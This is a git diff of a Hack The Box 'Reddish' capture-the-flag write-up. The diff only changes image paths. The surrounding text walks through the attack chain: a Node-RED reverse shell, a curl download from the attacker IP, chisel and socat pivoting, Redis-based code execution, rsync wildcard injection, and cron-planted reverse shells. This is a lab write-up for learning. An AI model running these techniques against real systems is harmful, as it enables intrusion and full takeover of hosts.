@@ -59,15 +59,15 @@ Copy the contents of [node-red reverse shell](https://raw.githubusercontent.com/
 ```
 
 On the node-red site click on the menu icon > import > clipboard.
-![import clipboard](img/htb/reddish/import_clipboard.png)
+![import clipboard](.gitbook/assets/img/htb/reddish/import_clipboard.png)
 
 Paste the contents of the [node-red reverse shell](https://raw.githubusercontent.com/valkyrix/Node-Red-Reverse-Shell/master/node-red-reverse-shell.json), then click on import.
 
-![import nodes](img/htb/reddish/import_nodes.png)
+![import nodes](.gitbook/assets/img/htb/reddish/import_nodes.png)
 
 Click on the node that shows the IP and Port.
 
-![ipport node](img/htb/reddish/ipport_node.png)
+![ipport node](.gitbook/assets/img/htb/reddish/ipport_node.png)
 
 Start a listener on the attacker machine using the chosen port.
 
@@ -77,11 +77,11 @@ nc -lnvp 9001
 
 Go to the node-red site and click on Deploy.
 
-![deploy](img/htb/reddish/deploy_shell.png)
+![deploy](.gitbook/assets/img/htb/reddish/deploy_shell.png)
 
 A reverse shell is received.
 
-![hostname container 1](img/htb/reddish/hostname_container_1.png)
+![hostname container 1](.gitbook/assets/img/htb/reddish/hostname_container_1.png)
 
 ## Access to nodered container
 
@@ -103,7 +103,7 @@ Once the new shell is received proceed to stabilize the shell:
 - export TERM=xterm
 - export SHELL=bash
 
-![shell container 1](img/htb/reddish/shell_container_1.png)
+![shell container 1](.gitbook/assets/img/htb/reddish/shell_container_1.png)
 
 The interfaces found in the hostname and the presence of a .dockerenv reveal that this is a docker container in a different network and the possibility of more containers existing. Proceed enumerating for more hosts a script in bash is created on the attacker machine and then transfered to nodered container.
 
@@ -172,7 +172,7 @@ On the nodered container use the `__curl` function to download the hostscan.sh s
 root@nodered:/tmp/workspace_nodered_container## __curl http://10.10.14.26/hostscan.sh > hostscan.sh
 ```
 
-![nodered hostscansh](img/htb/reddish/nodered_hostscansh.png)
+![nodered hostscansh](.gitbook/assets/img/htb/reddish/nodered_hostscansh.png)
 
 The scan shows that in the network 172.19.0.0 exist other three hosts besides 172.19.0.4 which is nodered. Proceed with enumerating the open ports of each host.
 
@@ -184,7 +184,7 @@ Performing a port scan of the active hosts returns other 2 results, an http serv
 bash netscan -P -t 172.19.0.3 -R 1-4 -r 1-10000
 ```
 
-![netscan hosts port](img/htb/reddish/netscan_hosts_ports.png)
+![netscan hosts port](.gitbook/assets/img/htb/reddish/netscan_hosts_ports.png)
 
 A network map is created for ease of reference.
 
@@ -232,11 +232,11 @@ Steps for using chisel for remote port forwarding
 
 Now that the port 80 of 172.19.0.2 is the port 81 it is possible to access the application through localhost:81 or 127.0.0.1:81
 
-![port 81 forward](img/htb/reddish/port81forward.png)
+![port 81 forward](.gitbook/assets/img/htb/reddish/port81forward.png)
 
 The source code found by inspecting the site using google chrome inspect element functionality shows that the site has a function that every time someone visits the index the number of "hits" increase, it also shows notes of backing up a database.
 
-![source code](img/htb/reddish/source_container_1.png)
+![source code](.gitbook/assets/img/htb/reddish/source_container_1.png)
 
 Proceeding to enumerate the redis server of 172.19.0.3.
 
@@ -337,7 +337,7 @@ bash redis-upload.sh
 ```
 
 Remote command execution is obtained on 172.19.0.2.
-![rce 172.19.0.2](img/htb/reddish/rce_172_19_0_2.png)
+![rce 172.19.0.2](.gitbook/assets/img/htb/reddish/rce_172_19_0_2.png)
 
 The attacker machine then transfers socat to the nodered container which the attacker machine has access, using socat it listens all the connections on port 9002 and redirects it to the attacker machine on port 9002, before doing this chisel is stopped with ctrl+c. [socat guide](https://www.cyberciti.biz/faq/linux-unix-tcp-port-forwarding/)
 
@@ -389,22 +389,22 @@ Trying to make ping to another machine results in an "operation not permitted" e
 
 Enumerating www a crontab shows that root is executing a task at every 3rd minute.
 
-![cron www](img/htb/reddish/cron_task_www.png) 
+![cron www](.gitbook/assets/img/htb/reddish/cron_task_www.png) 
 
 The script backup has a flaw in the wildcard option since an attacker can create a file such as "-e sh" to execute arbitrary commands.
 
 ```bash
 rsync -a *.rdb rsync://backup:873/src/rdb
 ```
-![rsync flaw](img/htb/reddish/rsync_flaw.png)
+![rsync flaw](.gitbook/assets/img/htb/reddish/rsync_flaw.png)
 
 To exploit the flaw the attacker creates a file.rdb with a bash reverse shell as the contents of it, a file named `-e bash file.rdb`  is created that will execute the reverse shell using the `-e` parameter.
 
-![rsync exploit](img/htb/reddish/rsync_exploit.png)
+![rsync exploit](.gitbook/assets/img/htb/reddish/rsync_exploit.png)
 
 After around a minute a reverse shell as root is sent back to the attacker. After analyzing the contents of /backup/backup.sh and once root can ping the machine, the ip of "backup" as well as the port is discovered and can be used to continue the exploitation.
 
-![finding backup](img/htb/reddish/finding_backup.png)
+![finding backup](.gitbook/assets/img/htb/reddish/finding_backup.png)
 
 Map of the network 
 ```bash
@@ -428,7 +428,7 @@ Map of the network
 
 After connecting with rsync, it was discovered that there is potential access to the cron.d folder, presenting a potential vector for attack. This access allows for both reading and writing privileges. This could be leveraged to create and execute tasks, such as initiating a reverse shell.
 
-![crond](img/htb/reddish/crond.png)
+![crond](.gitbook/assets/img/htb/reddish/crond.png)
 
 Before proceeding, the initial step involves downloading socat to the www container. This can be achieved by utilizing the already listening socat on the nodered server, redirecting port 9002 of nodered to the attacker machine's port 9002. Consequently, if a web server is launched by the attacker on port 9002, and a curl request is made from the www server to nodered on port 9002, the response received will be from the attacker machine's website.
 
@@ -463,7 +463,7 @@ rsync task rsync://backup:873/src/etc/cron.d/task
 ```
 A reverse shell is obtained.
 
-![revshell on backup](img/htb/reddish/revshell_backup.png)
+![revshell on backup](.gitbook/assets/img/htb/reddish/revshell_backup.png)
 
 Map updated
 
@@ -487,20 +487,20 @@ Map updated
 
 After obtaining root access in the backup container, it was observed using df -h that a portion of /dev/sda2, specifically /backup, is mounted within the container. This suggests that /dev/sda2 likely corresponds to the primary machines
 
-![mount backup](img/htb/reddish/mount_backup.png)
+![mount backup](.gitbook/assets/img/htb/reddish/mount_backup.png)
 
 It is confirmed that /dev/sda2 is associated with the filesystem of the reddish machine. Consequently, it is possible to access and retrieve both the root and user flags
 
-![mounted reddish](img/htb/reddish/mounted_reddish.png)
+![mounted reddish](.gitbook/assets/img/htb/reddish/mounted_reddish.png)
 
 To establish a reverse shell, set up a crontab on the reddish machine to grant access to the attacker machine.
 
-![creating cron](img/htb/reddish/creating_cron.png)
+![creating cron](.gitbook/assets/img/htb/reddish/creating_cron.png)
 
 And finally root is obtained.
 
-![root](img/htb/reddish/root.png)
+![root](.gitbook/assets/img/htb/reddish/root.png)
 
 Final map
 
-![map](img/htb/reddish/reddishmap.png)
+![map](.gitbook/assets/img/htb/reddish/reddishmap.png)
